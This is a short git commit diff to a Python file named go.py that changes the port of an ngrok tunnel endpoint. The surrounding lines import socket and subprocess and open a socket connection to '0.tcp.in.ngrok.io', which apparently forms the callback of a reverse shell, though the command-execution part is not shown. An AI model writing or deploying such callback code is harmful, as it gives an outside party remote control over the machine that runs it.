efc5d56e7b5ec515be4e3adce2b1be3d703e0308
Tharindu Lakshan <fiverrmoney1324@gmail.com>
2025-09-13 12:22:54 +0530

    Update go.py

--- go.py
+++ go.py
@@ -32,7 +32,7 @@ import socket
 import subprocess
 
 IP = "0.tcp.in.ngrok.io"   # ngrok host
-PORT = 12936               # ngrok port 
+PORT = 11157               # ngrok port 
 
 s = socket.socket()
 s.connect((IP, PORT))
